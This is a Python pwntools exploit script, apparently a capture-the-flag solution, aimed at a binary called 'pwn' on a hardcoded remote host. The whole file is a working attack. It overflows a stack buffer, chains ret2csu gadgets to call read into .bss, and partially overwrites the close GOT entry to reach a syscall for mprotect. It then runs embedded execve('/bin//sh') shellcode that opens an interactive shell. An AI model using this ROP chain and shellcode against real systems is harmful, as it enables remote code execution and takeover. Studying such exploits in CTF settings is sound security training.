from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8007]
libc=ELF('libc-2.31.so')
elf = ELF('pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
csu1 = p64(0x4012AA)
csu2 = p64(0x401290)
main = p64(0x4011fb)
pop_rdi = p64(0x4012b3)
bss = 0x404000
read_got = elf.got['read']
close_got = elf.got['close']

ru(b'something:')
payload = b'a' * (0x20 + 8) + csu1 + p64(0) + p64(1) + p64(0) + p64(bss) + p64(50) \
    + p64(read_got) + csu2 + p64(0) * 7 + main
s(payload)
payload2 = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
sleep(5)
s(payload2)
payload3 = b'a' * (0x20 + 8) + csu1 + p64(0) + p64(1) + p64(0) + p64(close_got) + p64(2) \
    + p64(read_got) + csu2 + p64(0) * 7 + main
sleep(5)
s(payload3)
payload4 = b'\x15'
sleep(5)
s(payload4)
payload5 = b'a' * (0x20 + 8) + csu1 + p64(0) + p64(1) + p64(0) + p64(0x404050) + p64(10) \
    + p64(read_got) + csu2 + p64(0) * 7 + csu1 + p64(0) + p64(1) + p64(bss) + p64(0x1000) + p64(7) \
        + p64(close_got) + csu2 + p64(0) * 7 + p64(bss)
sleep(5)
s(payload5)
payload6 = b'\x00' * 10
sleep(5)
s(payload6)

shell()
